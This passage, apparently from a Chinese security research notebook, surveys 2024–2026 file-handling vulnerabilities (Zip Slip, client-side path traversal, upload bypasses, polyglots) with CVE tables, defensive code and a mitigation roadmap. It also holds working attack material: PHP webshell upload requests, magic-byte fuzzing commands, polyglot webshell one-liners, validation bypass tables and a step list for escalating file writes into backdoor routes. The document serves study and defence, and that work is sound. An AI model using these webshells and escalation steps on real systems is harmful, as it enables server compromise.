来源: [Qualys — CVE-2024-53677 分析](https://blog.qualys.com/vulnerabilities-threat-research/2024/12/16/critical-apache-struts-file-upload-vulnerability-cve-2024-53677-risks-implications-and-enterprise-countermeasures) / [SonicWall — Struts Path Traversal to RCE](https://www.sonicwall.com/blog/apache-struts-path-traversal-to-rce-cve-2024-53677) / [GitHub POC](https://github.com/TAM-K592/CVE-2024-53677-S2-067)

---

### D2. Archive Zip Slip 系列 CVE（2025-2026）

#### D2.1 CVE-2025-11001 / CVE-2025-11002 — 7-Zip 路径遍历

- **影响**: 7-Zip < 24.09
- **根因**: 处理 archive 内 symlink 时未正确限制目标路径
- **POC 模型**:
```bash
# 构造恶意 7z archive
mkdir malicious
cd malicious
ln -s ../../../../tmp/pwned symlink
echo "payload" > payload.txt
7z a exploit.7z symlink payload.txt

# 解压时会跟随 symlink 写入 /tmp/pwned
```

来源: [Medium — 7-Zip Path Traversal Writeup](https://medium.com/@telynor_51425/7-zip-path-traversal-cve-2025-11001-11002-when-your-archive-decides-to-go-rogue-a75211431ff7)

#### D2.2 CVE-2025-3445 — mholt/archiver (Go) Zip Slip

- **影响**: Go 流行库 mholt/archiver v3
- **根因**: tar/zip 解压时未校验 symlink 目标
- **POC**:
```go
// 构造恶意 ZIP
import "archive/zip"

w := zip.NewWriter(file)
// 添加 symlink 指向 ../../../etc/passwd
hdr := &zip.FileHeader{
    Name:   "symlink",
    Method: zip.Deflate,
}
hdr.SetMode(os.ModeSymlink | 0755)
f, _ := w.CreateHeader(hdr)
f.Write([]byte("../../../etc/passwd"))
w.Close()
```

来源: [JFrog — CVE-2025-3445 archiver Zip Slip](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/) / [Red Hat Advisory](https://access.redhat.com/security/cve/cve-2025-3445)

#### D2.3 CVE-2025-69874 — nanotar

- **影响**: nanotar (轻量级 tar 库)
- **类型**: 路径遍历
- 来源: [GitHub Disclosure](https://github.com/EthanKim88/ethan-cve-disclosures/blob/main/CVE-2025-69874-nanotar-Path-Traversal.md)

#### D2.4 CVE-2026-40258 — Gramps-WebAPI Zip Slip

- **影响**: Gramps-WebAPI 媒体存档导入
- **权限**: 认证用户（owner 级别）
- 来源: [Endor Labs CVE-2026-40258](https://www.endorlabs.com/vulnerability/cve-2026-40258)

#### D2.5 CVE-2025-8088 — WinRAR 目录穿越

- **影响**: WinRAR < 7.10
- **根因**: 处理恶意压缩包时目录穿越
- **POC**: 构造 ZIP 包含相对路径，解压时写入任意位置（如 `C:\Windows\System32\`）
- 来源: [奇安信技术研究院](https://research.qianxin.com/archives/category/技术报告)

#### D2.6 Zip Slip 通用防御

```python
# Python — 安全解压
import os
import zipfile

def safe_extract(zip_path, extract_dir):
    extract_dir = os.path.abspath(extract_dir)
    with zipfile.ZipFile(zip_path) as zf:
        for member in zf.namelist():
            member_path = os.path.abspath(os.path.join(extract_dir, member))
            # 检查路径不超出 extract_dir
            if not member_path.startswith(extract_dir + os.sep):
                raise ValueError(f"Path traversal attempt: {member}")
            # 拒绝 symlink
            if member.startswith('/') or '..' in member.split('/'):
                raise ValueError(f"Dangerous path: {member}")
        zf.extractall(extract_dir)

# Go — 使用 mholt/archiver v4（修复版）
# import "github.com/mholt/archives"
# 自动拒绝 symlink 路径遍历
```

来源: [ASEC — Zip Slip Educational](https://asec.ahnlab.com/en/89890/) / [Alpha-Omega Whitepaper](https://alpha-omega.dev/wp-content/uploads/sites/22/2025/10/ao_wp_102725a.pdf)

---

### D3. 客户端路径遍历（CSPT）— 2025 新攻击面

Doyensec 在 2024-07 提出 CSPT 概念，2025 年迅速演化。

#### D3.1 CSPT → CSRF（Doyensec CSPT2CSRF）

```javascript
// 漏洞代码：前端 JS 拼接 URL
fetch('/api/users/' + userId + '/profile')

// 攻击 payload:
userId = '../../../admin/delete'

// 实际请求:
fetch('/api/users/../../../admin/delete/profile')
// 服务端 normalize 后: /admin/delete/profile
// 攻击者通过前端可控参数触发任意 API 调用

// 关键: 绕过 CSRF 防护（请求来自同源、带 Cookie）
```

#### D3.2 CVE-2025-4123 — Grafana CSPT → XSS + Open Redirect + SSRF

```javascript
// Grafana 前端存在 CSPT，链式利用:
// 1. CSPT 让请求指向 /api/admin/settings
// 2. 通过该接口的响应触发 XSS
// 3. XSS 中调用 /api/admin/proxy?url=... 触发 SSRF
// 4. SSRF 访问内网服务
// 完整 RCE 链
```

来源: [InfoSec Writeups — Grafana CVE-2025-4123](https://infosecwriteups.com/how-one-path-traversal-in-grafana-unleashed-xss-open-redirect-and-ssrf-cve-2025-4123-b35245dccaab) / [Doyensec — CSPT2CSRF](https://blog.doyensec.com/2024/07/02/cspt2csrf.html)

#### D3.3 CSPT 在 Header-based Auth 中的利用

[Kulkan Security — CSPT in Header-based Auth](https://blog.kulkan.com/client-side-path-traversal-exploiting-csrf-in-header-based-auth-scenarios-31c26a1baece)：

```http
# Bearer Token 认证场景
# 传统 CSRF 防护（SameSite Cookie）无效
# CSPT 通过 fetch 自动附加 Authorization header

# 漏洞代码:
const response = await fetch(`/api/v1/users/${userInput}/data`, {
    headers: { 'Authorization': `Bearer ${token}` }
});

# 攻击 payload:
userInput = '../../admin/users/all'
# 自动访问 /api/v1/admin/users/all 带 admin 权限
```

#### D3.4 防御

```javascript
// 1. 使用 URL 对象而非字符串拼接
const url = new URL('/api/users/profile', location.origin);
url.searchParams.set('id', userId);  // ← 参数化
fetch(url);

// 2. 服务端严格路由匹配，禁止 normalize ../
// Nginx: merge_slashes off; (谨慎，可能影响其他功能)

// 3. 前端使用 URL encoding
encodeURIComponent(userId)

// 4. CSP 严格限制 fetch 目标
```

来源: [Doyensec — CSPT File Upload](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html) / [Vitor Falcao — CSPT 实战](https://vitorfalcao.com/posts/hacking-high-profile-targets/) / [VeryLazyTech — CSPT Guide](https://www.verylazytech.com/pentesting-web/client-side-path-traversal)

---

### D4. Magic Bytes 模糊测试与 Polyglot 文件

#### D4.1 CVE-2025-70457 — Image Gallery MIME 伪造

- **影响**: Image Gallery App v1.0
- **漏洞**: 通过 MIME 类型欺骗上传 PHP 文件
- **POC 模型**:
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg   ← 伪造 MIME

<?php system($_GET['c']); ?>
------boundary--
```

#### D4.2 CVE-2026-30821 — Flowise 未授权上传 → RCE

- **影响**: Flowise 附件 API 未授权
- **绕过**: MIME 类型欺骗绕过内容校验
- **结果**: 任意文件上传 → RCE
- 来源: [Miggo CVE-2026-30821](https://www.miggo.io/vulnerability-database/cve/CVE-2026-30821)

#### D4.3 ffuf 模糊测试 Magic Bytes

[Medium — File Upload Bypass with ffuf](https://medium.com/@opabravo/file-upload-bypass-fuzz-magic-bytes-mime-types-with-ffuf-b218171533d4)：

```bash
# 1. 准备 magic bytes 字典
# magic_bytes.txt 内容:
\xFF\xD8\xFF  # JPEG
\x89PNG\r\n\x1a\n  # PNG
GIF89a  # GIF
%PDF-1.5  # PDF
PK\x03\x04  # ZIP

# 2. 准备 PHP webshell 模板
echo '<?php system($_GET["c"]); ?>' > shell.php

# 3. ffuf 模糊测试
ffuf -w magic_bytes.txt -X POST \
  -F "file=@shell.php;filename=test.php" \
  -F "type=FUZZ" \
  -u http://target.com/upload \
  -mc 200,201

# 4. 组合 magic bytes + PHP webshell
# JPG + PHP (polyglot):
echo -e '\xFF\xD8\xFF\xE0<?php system($_GET["c"]); ?>' > shell.jpg
# 文件头是 JPG,但 PHP 解析器会执行 PHP 部分
```

#### D4.4 Polyglot 文件（2025 最新）

```bash
# 1. JPG + PHP (服务器把 .jpg 当 PHP 解析时)
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
mv image.jpg image.jpg.php

# 2. PDF + JavaScript
%PDF-1.5
1 0 obj
<< /JS (alert(1)) >>
endobj

# 3. ZIP + JPEG (双方都能解析)
# 工具: https://github.com/cyberark/PolyglotZipJPEG

# 4. Phar + Any (PHP 归档)
# 文件签名: tar/zip + Phar metadata
# 在 PHP 反序列化链中触发

# 5. HTML + Image (CSPT bypass)
# 上传图片，里面是合法 HTML，通过 CSPT 让浏览器渲染

# 6. WAV + JS (音频 + 脚本)
# https://github.com/0xSparged/PolyWAV
```

#### D4.5 Magic Bytes 校验绕过技巧

| 防御 | 绕过 |
|------|------|
| 仅检查 MIME | 修改 Content-Type header |
| 仅检查扩展名 | 大小写、双扩展、null byte |
| 仅检查 magic bytes | 仅文件头前 N 字节 → 补充 payload |
| 完整 magic + 扩展名 | Polyglot 文件 |
| 服务端 getimagesize() | 真实图片 + 注释 PHP |
| 服务端 ImageMagick 解析 | ImageTragick (CVE-2016-3714) |
| 反病毒扫描 | 加密/混淆、分割 payload |

来源: [Intigriti — Bypassing Magic Byte Validation](https://x.com/intigriti/status/2002085784199852328) / [Intigriti — Advanced File Uploads Guide](https://www.intigriti.com/researchers/blog/hacking-tools/insecure-file-uploads-a-complete-guide-to-finding-advanced-file-upload-vulnerabilities) / [Kayssel — File Upload to Full Compromise](https://www.kayssel.com/newsletter/issue-25/)

---

### D5. 2025-2026 综合 CVE 速查（文件类）

| CVE | 产品 | 类型 | 备注 |
|------|------|------|------|
| **CVE-2024-53677** | Apache Struts | 文件上传 → RCE | [Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2024/12/16/critical-apache-struts-file-upload-vulnerability-cve-2024-53677-risks-implications-and-enterprise-countermeasures) |
| CVE-2025-11001/11002 | 7-Zip | Zip Slip via symlink | [Medium Writeup](https://medium.com/@telynor_51425/) |
| CVE-2025-3445 | mholt/archiver (Go) | Zip Slip | [JFrog](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/) |
| CVE-2025-69874 | nanotar | 路径遍历 | [GitHub](https://github.com/EthanKim88/ethan-cve-disclosures/) |
| CVE-2026-40258 | Gramps-WebAPI | Zip Slip | [Endor Labs](https://www.endorlabs.com/vulnerability/cve-2026-40258) |
| CVE-2025-8088 | WinRAR | 目录穿越 | 奇安信技术研究院 |
| **CVE-2025-4123** | Grafana | CSPT → XSS + SSRF | [InfoSec Writeups](https://infosecwriteups.com/how-one-path-traversal-in-grafana-unleashed-xss-open-redirect-and-ssrf-cve-2025-4123-b35245dccaab) |
| CVE-2025-34508 | ZendTo | 路径遍历 | [Horizon3.ai](https://horizon3.ai/attack-research/attack-blogs/cve-2025-34508-another-file-sharing-application-another-path-traversal/) |
| CVE-2025-70457 | Image Gallery App v1.0 | MIME 伪造 → RCE | [SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-70457/) |
| CVE-2026-30821 | Flowise | 未授权上传 → RCE | [Miggo](https://www.miggo.io/vulnerability-database/cve/CVE-2026-30821) |
| CVE-2025-53101 | ImageMagick | 内存破坏 | JFrog |
| CVE-2025-55154 | ImageMagick ReadOneMNGImage | 内存破坏 | ZeroPath |
| CVE-2025-68618 | ImageMagick SVG | DoS | SentinelOne |
| CVE-2025-66516 | Apache Tika | XXE | Akamai |
| CVE-2024-28995 | SolarWinds Serv-U FTP | 目录遍历 | 奇安信 |
| — | 奇安信天擎 rptsvr | 任意文件上传 | 奇安信 2024 漏洞态势 |

---

### D6. 奇安信/中文社区精华（文件类）

#### D6.1 奇安信 2024 漏洞态势

[奇安信 2024 漏洞态势报告](https://www.qianxin.com/news/detail?news_id=13008)：
- 2024 年攻防演练监测到 13 个 0day
- OA 漏洞占比约 26%（文件上传/路径遍历高发）
- OA、VPN、ERP 等企业应用是文件操作类漏洞的主要目标

#### D6.2 奇安信攻防社区

- [奇安信攻防社区 — 漏洞分析板块](https://mdr.skyeye.qianxin.com/forum/community/Vul_analysis)
- [奇安信技术研究院 — 技术报告](https://research.qianxin.com/archives/category/技术报告)
- [奇安信威胁情报中心 — ti.qianxin.com](https://ti.qianxin.com/vulnerability/notice-list)

#### D6.3 知乎专栏 — 2025 漏洞合集

- [2025 漏洞合集 / POC 持续更新](https://zhuanlan.zhihu.com/p/1932214870562047555) — 包含奇安信天擎 rptsvr 文件上传、getsimilarlist SQL 注入等

---

### D7. 2025-2026 文件操作防御升级路线图

| 层级 | 措施 | 优先级 |
|------|------|--------|
| **上传** | 文件类型白名单（仅允许） | P0 |
| **上传** | Magic bytes 校验 + 完整内容解析 | P0 |
| **上传** | 文件名重命名（UUID） | P0 |
| **上传** | 上传目录禁止执行权限 | P0 |
| **上传** | 文件大小限制 + 类型限制 | P0 |
| **上传** | 独立子域 / CDN 提供上传文件 | P1 |
| **上传** | ImageMagick 严格 policy.xml + 禁用 Ghostscript | P0 |
| **上传** | 病毒扫描（ClamAV / Yara） | P1 |
| **下载** | 路径白名单（绝对路径校验） | P0 |
| **下载** | Symbolic Link 解析后校验 | P0 |
| **下载** | 鉴权 + Ownership check | P0 |
| **Archive** | Zip Slip 防护（normalize + prefix check） | P0 |
| **Archive** | 升级 7-Zip / WinRAR / mholt-archiver | P0 |
| **Archive** | 拒绝 symlink in archive | P0 |
| **CSPT** | 前端 URL 参数化（避免拼接） | P1 |
| **CSPT** | 服务端严格路由匹配 | P1 |
| **CSPT** | CSP 限制 fetch 目标 | P2 |
| **LFI** | 禁用 PHP 远程 include | P0 |
| **LFI** | 禁用 `allow_url_include` | P0 |
| **LFI** | 升级到最新 PHP / Java | P0 |
| **检测** | 文件上传日志 + 异常文件名告警 | P1 |
| **应急** | WAF 规则：阻止 `../` / null byte / 双扩展 | P0 |

---

### D8. 参考资源更新

**CVE 详细分析**:
- [Qualys — CVE-2024-53677 Struts](https://blog.qualys.com/vulnerabilities-threat-research/2024/12/16/critical-apache-struts-file-upload-vulnerability-cve-2024-53677-risks-implications-and-enterprise-countermeasures)
- [SonicWall — Struts Path Traversal to RCE](https://www.sonicwall.com/blog/apache-struts-path-traversal-to-rce-cve-2024-53677)
- [TAM-K592 — CVE-2024-53677 POC](https://github.com/TAM-K592/CVE-2024-53677-S2-067)
- [JFrog — CVE-2025-3445 archiver Zip Slip](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Red Hat — CVE-2025-3445 Advisory](https://access.redhat.com/security/cve/cve-2025-3445)
- [Horizon3.ai — CVE-2025-34508 ZendTo](https://horizon3.ai/attack-research/attack-blogs/cve-2025-34508-another-file-sharing-application-another-path-traversal/)
- [InfoSec Writeups — CVE-2025-4123 Grafana](https://infosecwriteups.com/how-one-path-traversal-in-grafana-unleashed-xss-open-redirect-and-ssrf-cve-2025-4123-b35245dccaab)

**CSPT**:
- [Doyensec — CSPT2CSRF (Foundational)](https://blog.doyensec.com/2024/07/02/cspt2csrf.html)
- [Doyensec — CSPT File Upload](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [Kulkan — CSPT in Header-based Auth](https://blog.kulkan.com/client-side-path-traversal-exploiting-csrf-in-header-based-auth-scenarios-31c26a1baece)
- [Vitor Falcao — CSPT 实战](https://vitorfalcao.com/posts/hacking-high-profile-targets/)
- [Renwa — CSPT Bug Bounty Reports](https://medium.com/@renwa/client-side-path-traversal-cspt-bug-bounty-reports-and-techniques-8ee6cd2e7ca1)
- [VeryLazyTech — CSPT Guide](https://www.verylazytech.com/pentesting-web/client-side-path-traversal)

**文件上传**:
- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [Intigriti — Advanced File Upload Guide](https://www.intigriti.com/researchers/blog/hacking-tools/insecure-file-uploads-a-complete-guide-to-finding-advanced-file-upload-vulnerabilities)
- [Kayssel — File Upload to Full Compromise](https://www.kayssel.com/newsletter/issue-25/)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

**Zip Slip**:
- [ASEC — Zip Slip Educational](https://asec.ahnlab.com/en/89890/)
- [Alpha-Omega — Slippery Zips Whitepaper](https://alpha-omega.dev/wp-content/uploads/sites/22/2025/10/ao_wp_102725a.pdf)
- [Snyk — Zip Slip](https://snyk.io/research/zip-slip-vulnerability)

**Magic Bytes / Polyglot**:
- [Medium — File Upload Bypass with ffuf](https://medium.com/@opabravo/file-upload-bypass-fuzz-magic-bytes-mime-types-with-ffuf-b218171533d4)
- [PolyglotZipJPEG — GitHub](https://github.com/cyberark/PolyglotZipJPEG)
- [Intigriti — Magic Byte Bypass](https://x.com/intigriti/status/2002085784199852328)

**中文社区**:
- [奇安信 2024 漏洞态势报告](https://www.qianxin.com/news/detail?news_id=13008)
- [奇安信威胁情报中心](https://ti.qianxin.com/vulnerability/notice-list)
- [奇安信攻防社区 — 漏洞分析](https://mdr.skyeye.qianxin.com/forum/community/Vul_analysis)
- [奇安信技术研究院](https://research.qianxin.com/archives/category/技术报告)
- [知乎 — 2025 漏洞合集](https://zhuanlan.zhihu.com/p/1932214870562047555)
- [阿里云 AVD 高危漏洞库](https://avd.aliyun.com/high-risk/list)

## 任意文件写 → RCE 的升级路径枚举法（2026 社区实战提炼）

> 来源：奇安信攻防社区《记一次曲折的onlyoffice漏洞利用》（forum.butian.net/share/4943）。
> 已知利用链被版本差异/补丁卡死时，按以下顺序枚举同权限可落地的升级面（OnlyOffice 实战：公开链全失效后
> 逐项排查，最终以「覆盖服务源码 + 借原有重启机制」落地）：

1. **覆盖 JS/路由文件**新增后门路由——多数服务需重启才加载（利用价值受限，记录）；
2. **覆盖模板文件**走 SSTI——模板即时生效、无需重启（若目标用模板引擎，优先于 1）；
3. **覆盖被 spawn/exec 的 ELF**——审计源码里所有 `spawnAsync/exec` 调用点，枚举服务运行用户可写的二进制
   （OnlyOffice 案例的 docbuilder 被 license 判断封死后，同目录 x2t 同样由转换任务触发，等价替代）；
4. **覆盖服务源码 + 触发原有重启机制**——上传改过的 server.js 后用目标自带的 supervisorctl/管理端点重启
   （重启动作本身要找一个无需更高权限的触发面），新路由即时生效；
5. 权限对齐检查：写出的文件属主/umask 必须与服务进程可读（OnlyOffice 案例 Redis 以 uid=33 运行才让
   nginx/php-fpm 读得到落盘 shell）。

- 通用判据：升级面 = 「可写路径 × 同用户可执行/可加载 × 存在触发路由/重启机制」三要素交集；
  逐项排查时把「为什么这条不行」记进 evidence（版本差异/权限/无触发面），避免重复试错。
- 来源: [奇安信攻防社区 — 记一次曲折的onlyoffice漏洞利用](https://forum.butian.net/share/4943)
